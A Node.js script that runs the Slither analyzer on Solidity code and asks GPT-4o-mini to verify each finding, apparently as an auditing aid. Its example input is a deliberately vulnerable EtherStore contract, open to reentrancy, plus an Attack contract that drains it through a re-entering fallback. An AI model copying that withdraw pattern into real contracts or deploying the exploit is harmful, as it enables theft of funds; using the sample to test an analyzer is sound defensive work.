const fs = require("fs");
const { exec } = require("child_process");
const path = require("path");
const OpenAI = require("openai");
require("dotenv").config();

const openai = new OpenAI({
  apiKey: process.env.OPENAI,
});

// Function to analyze Solidity code using Slither and verify with GPT
async function analyzeAndVerifySolidityCode(solidityCode) {
  return new Promise((resolve, reject) => {
    // Step 1: Create a temporary Solidity file
    const tempFilePath = path.join(__dirname, "tempContract.sol");
    fs.writeFileSync(tempFilePath, solidityCode);

    // Step 2: Run Slither on the temporary Solidity file
    const slitherCommand = `slither ${tempFilePath} --json result.json`;
    exec(slitherCommand, async (error, stdout, stderr) => {
      //   if (error) {
      //     reject(`Error running Slither: ${stderr}`);
      //     return;
      //   }

      // Step 3: Read the Slither analysis result from result.json
      const resultFilePath = path.join(__dirname, "result.json");
      fs.readFile(resultFilePath, "utf8", async (err, data) => {
        if (err) {
          reject(`Error reading Slither result: ${err}`);
          return;
        }

        try {
          const slitherResult = JSON.parse(data);
          const vulnerabilities = slitherResult.results.detectors;

          //   Step 4: Verify each vulnerability using GPT
          const verificationResults = [];
          for (const vulnerability of vulnerabilities) {
            try {
              const gptResult = await callGPT(vulnerability, solidityCode);
              verificationResults.push({
                vulnerability: vulnerability.check,
                gptResult: JSON.parse(gptResult),
              });
            } catch (gptError) {
              console.error(
                `Error verifying vulnerability with GPT: ${gptError}`
              );
            }
          }

          //   resolve(verificationResults);
        } catch (parseError) {
          reject(`Error parsing JSON: ${parseError}`);
        } finally {
          // Clean up: Remove the temporary files
          fs.unlinkSync(tempFilePath);
          fs.unlinkSync(resultFilePath);
        }
      });
    });
  });
}

// Example GPT verification function (as provided by you)
async function callGPT(vulnerability, code) {
  delete vulnerability.fingerprint;

  let retries = 4;
  while (retries > 0) {
    try {
      const systemPrompt = `You are an expert smart contract auditor... [omitting for brevity]`;
      const message = {
        model: "gpt-4o-mini",
        temperature: 0,
        top_p: 0,
        response_format: { type: "json_object" },
        max_tokens: 1000,
        seed: 1,
        messages: [
          { role: "system", content: systemPrompt },
          {
            role: "user",
            content: `Analyze the vulnerability and return the result as a JSON object:\n\n${JSON.stringify(
              vulnerability
            )}\n_______\nAgainst the smart contract code:\n\n${code}`,
          },
        ],
      };

      const response = await openai.chat.completions.create(message);
      console.log(JSON.parse(response.choices[0].message.content));

      return response.choices[0].message.content;
    } catch (e) {
      console.error("Error calling GPT:", e);
      console.log(`Retrying... ${retries} attempts left`);
      retries -= 1;
      await new Promise((resolve) => setTimeout(resolve, retries * 1000));
    }
  }
  throw new Error("AI Call Failure");
}

// Example Solidity code input
const solidityCode = `
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}`;

// Example usage
analyzeAndVerifySolidityCode(solidityCode)
  .then((result) => {
    console.log("Slither Analysis Result:", result);
  })
  .catch((error) => {
    console.error("Error:", error);
  });
